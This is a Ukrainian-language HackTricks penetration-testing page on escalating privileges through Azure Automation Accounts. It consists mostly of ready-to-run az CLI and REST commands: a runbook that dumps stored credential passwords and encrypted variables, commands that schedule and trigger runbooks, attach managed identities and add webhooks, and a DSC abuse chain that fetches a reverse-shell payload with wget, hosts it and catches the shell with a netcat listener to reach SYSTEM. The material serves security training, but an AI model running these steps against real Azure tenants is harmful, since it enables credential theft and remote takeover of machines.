# Az - Azure Automation Accounts Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Azure Automation Accounts

Для отримання додаткової інформації перегляньте:

{{#ref}}
../az-services/az-automation-accounts.md
{{#endref}}

### Hybrid Workers

Пам'ятайте, що якщо зловмисник зможе виконати довільний runbook (довільний код) у гібридному робітнику, він **перейде до місця розташування VM**. Це може бути локальна машина, VPC іншого хмари або навіть Azure VM.

Більше того, якщо гібридний робітник працює в Azure з іншими прикріпленими керованими ідентичностями, runbook зможе отримати доступ до **керованої ідентичності runbook та всіх керованих ідентичностей VM з сервісу метаданих**.

> [!TIP]
> Пам'ятайте, що **сервіс метаданих** має іншу URL-адресу (**`http://169.254.169.254`**), ніж сервіс, з якого отримують токен керованих ідентичностей облікового запису автоматизації (**`IDENTITY_ENDPOINT`**).

### `Microsoft.Automation/automationAccounts/jobs/write`, `Microsoft.Automation/automationAccounts/runbooks/draft/write`, `Microsoft.Automation/automationAccounts/jobs/output/read`, `Microsoft.Automation/automationAccounts/runbooks/publish/action` (`Microsoft.Resources/subscriptions/resourcegroups/read`, `Microsoft.Automation/automationAccounts/runbooks/write`)

У підсумку ці дозволи дозволяють **створювати, змінювати та виконувати Runbooks** в обліковому записі автоматизації, які ви можете використовувати для **виконання коду** в контексті облікового запису автоматизації та ескалації привілеїв до призначених **керованих ідентичностей** та витоку **облікових даних** і **зашифрованих змінних**, збережених в обліковому записі автоматизації.

Дозвіл **`Microsoft.Automation/automationAccounts/runbooks/draft/write`** дозволяє змінювати код Runbook в обліковому записі автоматизації, використовуючи:
```bash
# Update the runbook content with the provided PowerShell script
az automation runbook replace-content --no-wait \
--resource-group Resource_Group_1 \
--automation-account-name autoaccount1 \
--name AzureAutomationTutorialWithIdentity \
--content '$creds = Get-AutomationPSCredential -Name "<credential-name>"
$runbook_variable = Get-AutomationVariable -Name "<encrypted-variable-name>"
$runbook_variable
$creds.GetNetworkCredential().username
$creds.GetNetworkCredential().password'
```
Зверніть увагу, як попередній скрипт може бути використаний для **витоку імені користувача та пароля** облікових даних і значення **зашифрованої змінної**, збереженої в обліковому записі автоматизації.

Дозвіл **`Microsoft.Automation/automationAccounts/runbooks/publish/action`** дозволяє користувачу публікувати Runbook в обліковому записі автоматизації, щоб зміни були застосовані:
```bash
az automation runbook publish \
--resource-group <res-group> \
--automation-account-name <account-name> \
--name <runbook-name>
```
Дозвіл **`Microsoft.Automation/automationAccounts/jobs/write`** дозволяє користувачу виконувати Runbook в Обліковому записі автоматизації за допомогою:
```bash
az automation runbook start \
--automation-account-name <account-name> \
--resource-group <res-group> \
--name <runbook-name> \
[--run-on <name-hybrid-group>]
```
Дозвіл **`Microsoft.Automation/automationAccounts/jobs/output/read`** дозволяє користувачу читати вихідні дані роботи в Обліковому записі автоматизації за допомогою:
```bash
az rest --method GET \
--url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Automation/automationAccounts/<automation-account-name>/jobs/<job-name>/output?api-version=2023-11-01"
```
Якщо Runbooks не створені, або ви хочете створити новий, вам знадобляться **дозволи `Microsoft.Resources/subscriptions/resourcegroups/read` та `Microsoft.Automation/automationAccounts/runbooks/write`** для цього, використовуючи:
```bash
az automation runbook create --automation-account-name <account-name> --resource-group <res-group> --name <runbook-name> --type PowerShell
```
### `Microsoft.Automation/automationAccounts/write`, `Microsoft.ManagedIdentity/userAssignedIdentities/assign/action`

Ця дозволяє користувачу **призначити керовану ідентичність користувача** для Облікового запису автоматизації за допомогою:
```bash
az rest --method PATCH \
--url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Automation/automationAccounts/<automation-account-name>?api-version=2020-01-13-preview" \
--headers "Content-Type=application/json" \
--body '{
"identity": {
"type": "UserAssigned",
"userAssignedIdentities": {
"/subscriptions/<subscripntion-id>/resourceGroups/<res-group>/providers/Microsoft.ManagedIdentity/userAssignedIdentities/<user-managed-identity-name>": {}
}
}
}'
```
### `Microsoft.Automation/automationAccounts/schedules/write`, `Microsoft.Automation/automationAccounts/jobSchedules/write`

З дозволом **`Microsoft.Automation/automationAccounts/schedules/write`** можливо створити новий графік в обліковому записі автоматизації, який виконується кожні 15 хвилин (не дуже приховано) за допомогою наступної команди.

Зверніть увагу, що **мінімальний інтервал для графіка становить 15 хвилин**, а **мінімальний час початку - 5 хвилин** у майбутньому.
```bash
## For linux
az automation schedule create \
--resource-group <RESOURCE_GROUP> \
--automation-account-name <AUTOMATION_ACCOUNT_NAME> \
--name <SCHEDULE_NAME> \
--description "Triggers runbook every minute" \
--start-time "$(date -u -d "7 minutes" +%Y-%m-%dT%H:%M:%SZ)" \
--frequency Minute \
--interval 15

## Form macOS
az automation schedule create \
--resource-group <RESOURCE_GROUP> \
--automation-account-name <AUTOMATION_ACCOUNT_NAME> \
--name <SCHEDULE_NAME> \
--description "Triggers runbook every 15 minutes" \
--start-time "$(date -u -v+7M +%Y-%m-%dT%H:%M:%SZ)" \
--frequency Minute \
--interval 15
```
Тоді, з дозволом **`Microsoft.Automation/automationAccounts/jobSchedules/write`** можливо призначити планувальник для runbook за допомогою:
```bash
az rest --method PUT \
--url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Automation/automationAccounts/<automation-accounts>/jobSchedules/b510808a-8fdc-4509-a115-12cfc3a2ad0d?api-version=2015-10-31" \
--headers "Content-Type=application/json" \
--body '{
"properties": {
"runOn": "",
"runbook": {
"name": "<runbook-name>"
},
"schedule": {
"name": "<scheduler-name>>"
},
"parameters": {}
}
}'
```
> [!TIP]
> У попередньому прикладі ідентифікатор jobchedule був залишений як **`b510808a-8fdc-4509-a115-12cfc3a2ad0d` як приклад** але вам потрібно буде використовувати довільне значення для створення цього призначення.

### `Microsoft.Automation/automationAccounts/webhooks/write`

З дозволом **`Microsoft.Automation/automationAccounts/webhooks/write`** можливо створити новий Webhook для Runbook всередині Automation Account, використовуючи наступну команду.

Зверніть увагу, що вам потрібно буде **вказати URI вебхука** з токеном для використання.
```bash
az rest --method PUT \
--url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Automation/automationAccounts/<automantion-account-name>/webhooks/<webhook-name>?api-version=2018-06-30" \
--body '{
"name": "<webhook-name>",
"properties": {
"isEnabled": true,
"expiryTime": "2026-01-09T20:03:30.291Z",
"parameters": {},
"runOn": null,
"runbook": {
"name": "<runbook-name>"
},
"uri": "https://f931b47b-18c8-45a2-9d6d-0211545d8c02.webhook.eus.azure-automation.net/webhooks?token=Ts5WmbKk0zcuA8PEUD4pr%2f6SM0NWydiCDqCqS1IdzIU%3d"
}
}'

# Then, to call the runbook using the webhook
curl -X POST "https://f931b47b-18c8-45a2-9d6d-0211545d8c02.webhook.eus.azure-automation.net/webhooks?token=Ts5WmbKk0zcuA8PEUD4pr%2f6SM0NWydiCDqCqS1IdzIU%3d" \
-H "Content-Length: 0"
```
### `Microsoft.Automation/automationAccounts/runbooks/draft/write`

Тільки з дозволом `Microsoft.Automation/automationAccounts/runbooks/draft/write` можливо **оновити код Runbook** без його публікації та виконати його за допомогою наступних команд.
```bash
# Update the runbook content with the provided PowerShell script
az automation runbook replace-content --no-wait \
--resource-group Resource_Group_1 \
--automation-account-name autoaccount1 \
--name AzureAutomationTutorialWithIdentity \
--content 'echo "Hello World"'

# Run the unpublished code
## Indicate the name of the hybrid worker group in runOn to execute the runbook there
az rest \
--method PUT \
--url "https://management.azure.com/subscriptions/9291ff6e-6afb-430e-82a4-6f04b2d05c7f/resourceGroups/Resource_Group_1/providers/Microsoft.Automation/automationAccounts/autoaccount1/runbooks/AzureAutomationTutorialWithIdentity/draft/testJob?api-version=2023-05-15-preview" \
--headers "Content-Type=application/json" \
--body '{
"parameters": {},
"runOn": "",
"runtimeEnvironment": "PowerShell-5.1"
}'

# Get the output (a different permission is needed here, but you could get a revershell or exfiltrate the token to avoid needing this permission)
az rest --method get --url "https://management.azure.com/subscriptions/9291ff6e-6afb-430e-82a4-6f04b2d05c7f/resourceGroups/Resource_Group_1/providers/Microsoft.Automation/automationAccounts/autoaccount1/runbooks/AzureAutomationTutorialWithIdentity/draft/testJob/streams?api-version=2019-06-01"
```
### `Microsoft.Automation/automationAccounts/sourceControls/write`, (`Microsoft.Automation/automationAccounts/sourceControls/read`)

Ця дозволяє користувачу **налаштувати контроль версій** для облікового запису автоматизації, використовуючи команди, такі як наступні (це використовує Github як приклад):
```bash
az automation source-control create \
--resource-group <res-group> \
--automation-account-name <automation-account-name> \
--name RemoteGithub \
--repo-url https://github.com/carlospolop/gh-runbooks.git \
--branch main \
--folder-path /runbooks/ \
--publish-runbook true \
--auto-sync \
--source-type GitHub \
--token-type PersonalAccessToken \
--access-token github_pat_11AEDCVZ<rest-of-the-token>
```
Це автоматично імпортує runbooks з репозиторію Github до Облікового запису автоматизації, і з деякими іншими дозволами для їх запуску буде **можливо підвищити привілеї**.

Більше того, пам'ятайте, що для роботи контролю версій в Облікових записах автоматизації він повинен мати керовану ідентичність з роллю **`Contributor`**, і якщо це керована користувачем ідентичність, ідентифікатор клієнта MI повинен бути вказаний у змінній **`AUTOMATION_SC_USER_ASSIGNED_IDENTITY_ID`**.

> [!TIP]
> Зверніть увагу, що неможливо змінити URL репозиторію контролю версій після його створення.

### `Microsoft.Automation/automationAccounts/variables/write`

З дозволом **`Microsoft.Automation/automationAccounts/variables/write`** можливо записувати змінні в Обліковий запис автоматизації, використовуючи наступну команду.
```bash
az rest --method PUT \
--url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Automation/automationAccounts/<automation-account-name>/variables/<variable-name>?api-version=2019-06-01" \
--headers "Content-Type=application/json" \
--body '{
"name": "<variable-name>",
"properties": {
"description": "",
"value": "\"<variable-value>\"",
"isEncrypted": false
}
}'
```
### Custom Runtime Environments

Якщо обліковий запис автоматизації використовує власне середовище виконання, може бути можливим перезаписати власний пакет середовища виконання деяким шкідливим кодом (наприклад, **задніми дверима**). Таким чином, щоразу, коли виконується runbook, що використовує це власне середовище виконання і завантажує власний пакет, шкідливий код буде виконано.

### Compromising State Configuration

**Перегляньте повну публікацію за адресою:** [**https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe**](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)

- Крок 1 — Створення файлів

**Необхідні файли:** Потрібні два скрипти PowerShell:
1. `reverse_shell_config.ps1`: Файл Desired State Configuration (DSC), який отримує та виконує payload. Його можна отримати з [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse_shell_config.ps1).
2. `push_reverse_shell_config.ps1`: Скрипт для публікації конфігурації на VM, доступний на [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push_reverse_shell_config.ps1).

**Налаштування:** Змінні та параметри в цих файлах повинні бути адаптовані до конкретного середовища користувача, включаючи імена ресурсів, шляхи до файлів та ідентифікатори серверів/payload.

- Крок 2 — Стиснення файлу конфігурації

Файл `reverse_shell_config.ps1` стискається в `.zip` файл, що робить його готовим для передачі до Azure Storage Account.
```powershell
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
- Крок 3 — Встановлення контексту зберігання та завантаження

Стиснутий файл конфігурації завантажується в заздалегідь визначений контейнер Azure Storage, azure-pentest, за допомогою cmdlet Set-AzStorageBlobContent від Azure.
```powershell
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
- Крок 4 — Підготовка Kali Box

Сервер Kali завантажує корисне навантаження RevPS.ps1 з репозиторію GitHub.
```bash
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
Скрипт редагується для вказання цільової Windows VM та порту для зворотного шелу.

- Крок 5 — Опублікувати файл конфігурації

Файл конфігурації виконується, в результаті чого скрипт зворотного шелу розгортається у вказаному місці на Windows VM.

- Крок 6 — Хостинг корисного навантаження та налаштування прослуховувача

Запускається Python SimpleHTTPServer для хостингу корисного навантаження, разом з прослуховувачем Netcat для захоплення вхідних з'єднань.
```bash
sudo python -m SimpleHTTPServer 80
sudo nc -nlvp 443
```
Заплановане завдання виконує корисне навантаження, досягаючи привілеїв рівня SYSTEM.

{{#include ../../../banners/hacktricks-training.md}}
